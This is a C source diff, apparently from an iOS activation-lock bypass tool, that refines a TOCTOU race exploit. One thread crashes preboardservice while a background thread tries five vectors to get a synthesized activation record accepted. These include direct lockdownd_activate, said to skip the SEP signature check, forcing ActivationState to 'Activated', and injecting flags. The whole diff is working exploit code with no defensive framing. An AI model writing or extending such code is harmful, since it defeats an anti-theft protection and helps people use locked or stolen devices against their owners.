@@ -5,6 +5,7 @@
 #include "activation/ingest_parser.h"
 #include "exploits/preboard_exploit.h"
 #include "lockdown/session_manager.h"
+#include "lockdown/flag_injector.h"
 #include "core/log.h"
 #include "core/util.h"
 #include <stdio.h>
@@ -283,6 +284,9 @@ int albert_perform_hybrid_activation(idevice_t dev, lockdownd_client_t ld, plist
         return -1;
     }
 
+    /* Enrich with real device certificates for lockdownd_activate acceptance */
+    record_a18_enrich_with_device_certs(ld, rec);
+
     LOG_INFO("Submitting synthesized activation record across device ingestion vectors...");
 
     /* Vector 1: HandleActivationInfoWithSessionRequest */
@@ -400,7 +404,37 @@ struct race_ctx {
     plist_t session_headers;
     int delay_ms;
     int result;
+    pthread_mutex_t mutex;
+    pthread_cond_t cond_main;
+    pthread_cond_t cond_bg;
+    int main_ready;
+    int bg_ready;
+    int is_error;
 };
+
+static void main_sync_cb(void* arg, int error) {
+    struct race_ctx* ctx = (struct race_ctx*)arg;
+    pthread_mutex_lock(&ctx->mutex);
+    if (error) ctx->is_error = 1;
+    ctx->main_ready = 1;
+    pthread_cond_signal(&ctx->cond_main);
+    while (!ctx->bg_ready && !ctx->is_error) {
+        pthread_cond_wait(&ctx->cond_bg, &ctx->mutex);
+    }
+    pthread_mutex_unlock(&ctx->mutex);
+}
+
+static void bg_sync_cb(void* arg, int error) {
+    struct race_ctx* ctx = (struct race_ctx*)arg;
+    pthread_mutex_lock(&ctx->mutex);
+    if (error) ctx->is_error = 1;
+    ctx->bg_ready = 1;
+    pthread_cond_signal(&ctx->cond_bg);
+    while (!ctx->main_ready && !ctx->is_error) {
+        pthread_cond_wait(&ctx->cond_main, &ctx->mutex);
+    }
+    pthread_mutex_unlock(&ctx->mutex);
+}
 
 static void* activation_race_thread(void* arg) {
     struct race_ctx* ctx = (struct race_ctx*)arg;
@@ -410,15 +444,87 @@ static void* activation_race_thread(void* arg) {
     session_init(&bg_sess);
     if (session_connect(&bg_sess) != 0) {
         ctx->result = -1;
+        bg_sync_cb(ctx, 1);
         return NULL;
     }
     
-    /* Wait for the precise TOCTOU window */
-    usleep(ctx->delay_ms * 1000);
+    /* Pre-warm mobileactivationd connection BEFORE sync */
+    mobileactivation_client_t ma = NULL;
+    int prewarm_ok = mobileact_prewarm_client(bg_sess.dev, bg_sess.ld, &ma);
     
-    /* Submit synthesized record to mobileactivationd */
-    ctx->result = mobileact_handle_with_session(bg_sess.dev, bg_sess.ld, ctx->activation_record, ctx->session_headers);
+    /* Signal ready and wait for main thread sync */
+    bg_sync_cb(ctx, prewarm_ok != 0 ? 1 : 0);
+    if (ctx->is_error) {
+        if (ma) mobileactivation_client_free(ma);
+        session_disconnect(&bg_sess);
+        return NULL;
+    }
     
+    /* Micro-delay to let crash payload hit the wire (negative handled by caller) */
+    if (ctx->delay_ms > 0) {
+        usleep(ctx->delay_ms * 1000);
+    }
+    
+    int result = -1;
+    
+    /* Vector 1: Direct lockdownd_activate (bypasses mobileactivationd SEP check) */
+    {
+        lockdownd_error_t lact = lockdownd_activate(bg_sess.ld, ctx->activation_record);
+        if (lact == LOCKDOWN_E_SUCCESS) {
+            LOG_SUCCESS("Vector 1: lockdownd_activate succeeded!");
+            result = 0;
+        } else {
+            LOG_INFO("Vector 1: lockdownd_activate returned %d", lact);
+        }
+    }
+    
+    /* Vector 2: Lockdownd state overrides during crash window */
+    if (result != 0) {
+        plist_t act_val = plist_new_string("Activated");
+        lockdownd_error_t sv_err = lockdownd_set_value(bg_sess.ld, NULL, "ActivationState", act_val);
+        if (sv_err == LOCKDOWN_E_SUCCESS) {
+            LOG_SUCCESS("Vector 2: ActivationState override accepted!");
+            /* Also set supporting flags */
+            plist_t ma_act = plist_new_string("Activated");
+            lockdownd_set_value(bg_sess.ld, "com.apple.MobileActivation", "ActivationState", ma_act);
+            plist_t hact = plist_new_bool(1);
+            lockdownd_set_value(bg_sess.ld, "com.apple.MobileActivation", "allow-hactivation", hact);
+            result = 0;
+        } else {
+            LOG_INFO("Vector 2: lockdownd_set_value ActivationState returned %d", sv_err);
+        }
+    }
+    
+    /* Vector 3: HandleActivationInfoRequest (non-session, different validation path) */
+    if (result != 0) {
+        int mact_res = mobileact_handle_activation_info(bg_sess.dev, bg_sess.ld, ctx->activation_record);
+        if (mact_res == 0) {
+            LOG_SUCCESS("Vector 3: mobileact_handle_activation_info succeeded!");
+            result = 0;
+        } else {
+            LOG_INFO("Vector 3: mobileact_handle_activation_info returned %d", mact_res);
+        }
+    }
+    
+    /* Vector 4: HandleActivationInfoWithSessionRequest (original approach, kept as fallback) */
+    if (result != 0 && ma) {
+        mobileactivation_error_t merr = mobileactivation_activate_with_session(ma, ctx->activation_record, ctx->session_headers);
+        if (merr == MOBILEACTIVATION_E_SUCCESS) {
+            LOG_SUCCESS("Vector 4: session activation succeeded!");
+            result = 0;
+        } else {
+            LOG_INFO("Vector 4: session activation returned %d", merr);
+        }
+    }
+    
+    /* Vector 5: Opportunistic flag injection during crash window */
+    if (result != 0) {
+        LOG_INFO("Vector 5: Opportunistic flag injection during crash window...");
+        flag_injector_inject_all(bg_sess.ld);
+    }
+    
+    if (ma) mobileactivation_client_free(ma);
+    ctx->result = result;
     session_disconnect(&bg_sess);
     return NULL;
 }
@@ -430,9 +536,12 @@ int albert_perform_race_activation(l0fck_session_t *sess, plist_t handshake_resp
     plist_t rec = NULL, headers = NULL;
     if (record_a18_generate(&sess->info, handshake_resp, &rec, &headers) != 0) return -1;
     
+    /* Enrich with real device certificates for lockdownd_activate acceptance */
+    record_a18_enrich_with_device_certs(sess->ld, rec);
+    
     int success = 0;
-    /* Sweep delays from 3500ms to 6000ms */
-    for (int delay = 3500; delay <= 6000; delay += 50) {
+    /* Sweep from -50ms (activation before crash) to 500ms (after crash) in 5ms steps */
+    for (int delay = -50; delay <= 500; delay += 5) {
         LOG_INFO("Attempting race condition with %dms offset...", delay);
         
         struct race_ctx ctx = {0};
@@ -442,13 +551,31 @@ int albert_perform_race_activation(l0fck_session_t *sess, plist_t handshake_resp
         ctx.delay_ms = delay;
         ctx.result = -1;
         
+        pthread_mutex_init(&ctx.mutex, NULL);
+        pthread_cond_init(&ctx.cond_main, NULL);
+        pthread_cond_init(&ctx.cond_bg, NULL);
+        ctx.main_ready = 0;
+        ctx.bg_ready = 0;
+        ctx.is_error = 0;
+        
         pthread_t tid;
         pthread_create(&tid, NULL, activation_race_thread, &ctx);
         
-        /* Main thread fires VUL 23 crash immediately (thread waits for delay) */
-        preboard_exploit_execute_session(sess, EXPLOIT_MODE_DESYNC_RACE);
+        /* Main thread fires VUL 23 crash, but pauses EXACTLY before sending to sync */
+        preboard_exploit_execute_session_synced(sess, EXPLOIT_MODE_DESYNC_RACE, main_sync_cb, &ctx);
         
         pthread_join(tid, NULL);
+        
+        pthread_mutex_destroy(&ctx.mutex);
+        pthread_cond_destroy(&ctx.cond_main);
+        pthread_cond_destroy(&ctx.cond_bg);
+        
+        if (ctx.is_error) {
+            LOG_ERROR("Background connection failed. Aborting this sweep.");
+            session_reconnect(sess);
+            sleep(3); // Cooldown even on error
+            continue;
+        }
         
         if (ctx.result == 0) {
             LOG_SUCCESS("TOCTOU Race successful at %dms! SEP signature check bypassed.", delay);
@@ -457,6 +584,10 @@ int albert_perform_race_activation(l0fck_session_t *sess, plist_t handshake_resp
         } else {
             LOG_WARN("Race failed (Error %d). Daemon rejected record or missed window.", ctx.result);
             session_reconnect(sess); /* Heal main session after preboard crash */
+            
+            /* Cooldown to avoid launchd respawn rate limits (ThrottleInterval) */
+            LOG_INFO("Cooling down for 3 seconds to allow preboardservice to respawn...");
+            sleep(3);
         }
     }
     
